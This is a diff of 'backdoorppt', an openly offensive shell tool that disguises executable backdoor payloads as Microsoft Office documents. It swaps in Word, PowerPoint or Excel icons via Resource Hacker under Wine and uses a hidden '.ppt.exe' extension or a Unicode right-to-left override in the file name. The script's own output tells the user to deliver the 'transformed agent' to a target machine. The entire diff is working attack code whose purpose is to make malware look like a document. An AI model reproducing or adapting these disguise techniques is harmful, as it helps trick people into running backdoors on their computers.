@@ -1,7 +1,7 @@
 #!/bin/sh
 ###
 # backdoorppt - A MS Office spoof extensions tool
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.5
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.6
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2017
 # codename: strange things happen under windows
 #
@@ -16,9 +16,9 @@
 
 
 
-# -----------------------------------
+#
 # Colorise shell Script output leters
-# -----------------------------------
+#
 Colors() {
 Escape="\033";
   white="${Escape}[0m";
@@ -33,40 +33,44 @@ Reset="${Escape}[0m";
 
 
 
-# ---------------------
+#
 # variable declarations
-# ---------------------
-VeR="1.5"
+#
+VeR="1.6"
 ArCh=`arch`
 IPATH=`pwd`
 HoME=`echo ~`
-# Read options in settings file..
+HkLm=`cat $HoME/.wine/system.reg | egrep -m 1 'ProductName' | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1 # wine windows version
+#
+# Read options (configurations) from settings file ..
+#
 tRan=`cat $IPATH/settings | egrep -m 1 "BASH_TRANSFORMATION" | cut -d '=' -f2` > /dev/null 2>&1
 ByPa=`cat $IPATH/settings | egrep -m 1 "RESOURCEHACKER_BYPASS" | cut -d '=' -f2` > /dev/null 2>&1
 
 
 
-# ------------------------
+#
 # configuring correct arch
-# ------------------------
+#
 if [ "$ArCh" = "i686" ]; then
-dEd="x86"
-arch="wine"
-PgFi="Program Files"
+  dEd="x86"
+  arch="wine"
+  PgFi="Program Files"
 else
-dEd="x64"
-arch="wine"           # 4w4k3 issue3 bug report
-PgFi="Program Files"  # 4w4k3 issue3 bug report
-#arch="wine64"
-#PgFi="Program Files (x86)"
+  dEd="x64"
+  arch="wine64"
+  PgFi="Program Files (x86)"
 fi
+#
+# Resource hacker install path (local)
+#
+RhI="$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe"
 
 
 
-
-# -------------
+#
 # Tool banner
-# ------------
+#
 cat << !
 
     +-+-+-+-+-+-+-+-+-+-+-+-+---+
@@ -79,11 +83,11 @@ cat << !
 
 
 Colors;
-echo ${YellowF}[⊶] Checking backend applications! ${Reset};
-sleep 1
-# ----------------------
+#
 # check for dependencies
-# ----------------------
+#
+echo ${BlueF}[☆]${white} Checking backend applications .. ${Reset};
+sleep 1
 if [ "$tRan" = "YES" ]; then
 echo "running default transformation method" > /dev/null 2>&1
 else
@@ -95,11 +99,12 @@ echo ${RedF}[x]${white} This script requires ruby to work! ${Reset};
 sleep 1
 exit
 else
-echo ${BlueF}[☆]${white} Ruby installation '->' ${GreenF}found! ${Reset};
+echo ${BlueF}[☆]${white}" Ruby installation   : ${GreenF}found! "${Reset};
 sleep 1
 fi
 fi
 
+# search for wine installation
 apc=`which wine`
 if [ "$?" != "0" ]; then
 echo ""
@@ -110,11 +115,11 @@ echo ${RedF}[x]${white} Please run: sudo apt-get install wine ${Reset};
 echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
 exit
 else
-echo ${BlueF}[☆]${white} Wine installation  '->' ${GreenF}found! ${Reset};
+echo ${BlueF}[☆]${white}" Wine installation   : ${GreenF}found! "${Reset};
 sleep 1
 fi
 
-
+# search for zenity installation
 apc=`which zenity`
 if [ "$?" != "0" ]; then
 echo ""
@@ -125,10 +130,11 @@ echo ${RedF}[x]${white} Please run: sudo apt-get install zenity ${Reset};
 echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
 exit
 else
-echo ${BlueF}[☆]${white} Zenity installation'->' ${GreenF}found! ${Reset};
+echo ${BlueF}[☆]${white}" Zenity installation : ${GreenF}found! "${Reset};
 sleep 1
 fi
 
+# search for xterm installation
 apc=`which xterm`
 if [ "$?" != "0" ]; then
 echo ""
@@ -139,20 +145,29 @@ echo ${RedF}[x]${white} Please run: sudo apt-get install xterm ${Reset};
 echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
 exit
 else
-echo ${BlueF}[☆]${white} Xterm installation   '->' ${GreenF}found! ${Reset};
+echo ${BlueF}[☆]${white}" Xterm installation  : ${GreenF}found! "${Reset};
 sleep 1
 fi
 
+#
+# Bypass Resource hacker funtion (replace icon)
+# OR search if drive_c correct folder exists
+#
 if [ "$ByPa" = "NO" ]; then
   if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
-    echo ${BlueF}[☆]${white} Wine Program Files  '->' ${GreenF}found! ${Reset};
+    echo ${BlueF}[☆]${white}" Wine $PgFi  : ${GreenF}found! "${Reset};
     sleep 1
   else
-    echo ${RedF}[x]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
+    echo ${RedF}[x]${white} Wine $PgFi '->' ${RedF}not found! ${Reset};
     echo ${RedF}[x]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
     sleep 1
     echo ${RedF}[x]${white} Please wait, running winecfg! ${Reset};
     winecfg > /dev/null 2>&1
+    echo ""
+    # List directorys just to be sure ..
+    echo ${RedF}Listing drive_c directorys: ${Reset};
+    ls $HoME/.wine/drive_c
+    echo ""
     sleep 1
     exit
   fi
@@ -160,46 +175,59 @@ fi
 
 
 
-# ------------------------
-# start of script funtions
-# ------------------------
+#
+# START OF SCRIPT FUNTIONS ..
+#
 rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-
-
 # orginal payload full-path variable
-UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
+UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED (.exe) ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
 # icon replacement variable
 if [ "$ByPa" = "NO" ]; then
-IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Microsoft-Word-2016.ico" FALSE "Microsost-Word-2013.ico" FALSE "Powerpoint-green.ico" FALSE "Powerpoint-blue.ico" FALSE "Powerpoint-orange.ico" FALSE "Microsoft-Excel.ico" --width 350 --height 290) > /dev/null 2>&1
+IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Microsoft-Word-2016.ico" FALSE "Microsost-Word-2013.ico" FALSE "Powerpoint-green.ico" FALSE "Powerpoint-blue.ico" FALSE "Powerpoint-orange.ico" FALSE "Microsoft-Excel.ico" FALSE "Input your own icon" --width 350 --height 310) > /dev/null 2>&1
+  #
+  # User have decided to input is own icon.ico file ..
+  # So, were is it ? (your icon.ico full path) ..
+  #
+  if [ "$IcOn" = "Input your own icon" ]; then
+    ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
+    PaTh="$ImR"
+  else
+    PaTh="$IPATH/icons/$IcOn"
+  fi
 fi
-# input payload outputname
+# Input payload output name (bash transformation) ..
 if [ "$tRan" = "YES" ];then
 MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
 fi
 
 
+  #
+  # If RH BYPASS its not active (settings file)
+  #
   if [ "$ByPa" = "NO" ]; then
-  # wine configurtions (winecfg)
-  echo ${BlueF}[☆]${white} Select [${YellowF}windows 7${white}] from winecfg... ${Reset};
-cat << !
+    #
+    # Config WINE windows version (if not supported) ..
+    #
+    if ! [ "$HkLm" = "Microsoft Windows 7" ]; then
+      echo ${RedF}[x]${white} Wine system detected: $HkLm ${Reset};
+      echo ${RedF}[x]${white} FakeImageExploiter requires: windows 7 version ..${Reset};
+      echo ${YellowF}[☆] Starting winecfg, Please sellect required version ..${Reset};
+      sleep 1
+      winecfg > /dev/null 2>&1
+    fi
 
-    The ResourceHacker provided by backdoorppt tool
-    requires wine to be set to 'windows 7' version.
-
-!
-  sleep 3
-  winecfg > /dev/null 2>&1
-  sleep 1
-
-    # check for resource hacker installation (wine)
-    if [ -f "$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe" ]; then
-      echo ${BlueF}[☆]${white} ResourceHacker.exe '->' ${GreenF}found! ${Reset};
+    #
+    # Check for resource hacker installation (wine)
+    #
+    if [ -f "$RhI" ]; then
+      echo ${BlueF}[☆]${white}" ResourceHacker.exe  : ${GreenF}found! "${Reset};
       sleep 1
     else
       echo ${RedF}[x]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
       sleep 1
 cat << !
+
     Installing ResourceHacker under .wine directorys... 
     Version:windows7 Arch:$dEd Path:drive_c/$PgFi
     $HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe
@@ -213,22 +241,33 @@ cat << !
       exit
     fi
 
-      # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
-      echo ${YellowF}[⊶] Working on backdoor agent! ${Reset};
-      sleep 1
-      echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
-      $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/output/backdoor.exe -action addskip -res $IPATH/icons/$IcOn -mask ICONGROUP,MAINICON,
-      echo ${BlueF}[☆]${white} Change backdoor agent icons '->' ${GreenF}done... ${Reset};
-      sleep 1
-    fi
+    #
+    # wine command to call resourcehacker and add an MS-WORD.ico to the backdoor
+    #
+    echo ${YellowF}[☆] Working on backdoor agent .. ${Reset};
+    sleep 1
+    echo ${BlueF}[☆]${white}" Transforming backdoor agent    : ${GreenF}done .. "${Reset};
+    $arch "$RhI" -open "$UpL" -save "$IPATH/output/backdoor.exe" -action addskip -res "$PaTh" -mask ICONGROUP,MAINICON,
+    echo ${BlueF}[☆]${white}" Change backdoor agent icons    : ${GreenF}done .. "${Reset};
+    sleep 1
 
+  else
+
+    # Copy binary to output folder to be manually transformed ..
+    cp $UpL $IPATH/output/backdoor.exe > /dev/null 2>&1
+    echo ${YellowF}[☆]${white} Manually change icon.ico sellected ..${Reset};
+    echo ${YellowF}[☆]${white} Use your favorite editor to change icon [backdoor.exe]${Reset};
+    echo ${YellowF}[☠] When finish, press any key to Continue ..${Reset};
+    # Waiting for you to finish (read op) ..
+    read op
+
+  fi
+
+
+    #
     # insert .ppt hidden extension
-    echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
-    # bypass wine64 issue
-    if [ "$ByPa" = "YES" ]; then
-      cp $UpL $IPATH/output/backdoor.exe > /dev/null 2>&1
-    fi
-
+    #
+    echo ${BlueF}[☆]${white}" Adding agent hidden extensions : ${GreenF}done .. "${Reset};
     # chose ruby or bash transformation
     if [ "$tRan" = "YES" ]; then
       mv $IPATH/output/backdoor.exe  $IPATH/output/$MiP.ppt.exe > /dev/null 2>&1
@@ -238,40 +277,37 @@ cat << !
 
   sleep 1
   cd $IPATH/output
-  # rename backdoor name
-  echo ${BlueF}[☆]${white} Word doc builder '(backdoorppt)' '->' ${GreenF}done... ${Reset};
+  # rename backdoor output name
+  echo ${BlueF}[☆]${white}" Word doc builder (backdoorppt) : ${GreenF}done .. "${Reset};
   if [ "$tRan" = "YES" ]; then
     echo "bash build" > /dev/null 2>&1
   else
-    ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
+    ruby -e 'File.rename("backdoor_ppt.exe", "s\xe2\x80\xaetpp.exe")'
   fi
   cd $IPATH
   sleep 1
 
 
-# -----------------------------
-# Display final output to user
-# -----------------------------
-echo ${YellowF}[⊶] Task over, Writing reports! ${Reset};
+#
+# Display final outputs to user
+#
+echo ${YellowF}[☆] Task over, Writing reports .. ${Reset};
 sleep 2
-
-if [ "$tRan" = "YES" ]; then
-cat << !
-
-    Icon select : $IcOn
-    Final file  : $IPATH/output/$MiP.ppt.exe
-    Tool Author : r00t-3xp10it (SSA RedTeam)
-!
-
-else
-
-cat << !
-
-    Icon select : $IcOn
-    Final file  : $IPATH/output/resumeexe.ppt
-    Tool Author : r00t-3xp10it (SSA RedTeam)
-!
+if [ "$IcOn" = "Input your own icon" ]; then
+IcOn="$PaTh"
 fi
+
+  if [ "$tRan" = "YES" ]; then
+    echo ""
+    echo ${RedF}"    Icon select : $IcOn"${Reset};
+    echo ${RedF}"    Final file  : $IPATH/output/$MiP.ppt.exe"${Reset};
+    echo ${RedF}"    Tool Author : r00t-3xp10it (SSA RedTeam)"${Reset};
+  else
+    echo ""
+    echo ${RedF}"    Icon select : $IcOn"${Reset};
+    echo ${RedF}"    Final file  : $IPATH/output/sexe.ppt"${Reset};
+    echo ${RedF}"    Tool Author : r00t-3xp10it (SSA RedTeam)"${Reset};
+  fi
 
 cat << !
 
@@ -284,12 +320,12 @@ cat << !
     deliver the transformed agent to the target machine.
 
 !
-
-# The user dont want to run the tool
-# aborted switch..
+#
+# The user dont want to run the tool (aborted switch) ..
+#
 else
-  echo ${RedF}[x]${white} Abort all tasks${RedF}!${Reset};
+  echo ${RedF}[x]${white} Aborting all tasks ..${Reset};
   sleep 2
 fi
-# exit
+# exit tool, and good nigth ..
 exit
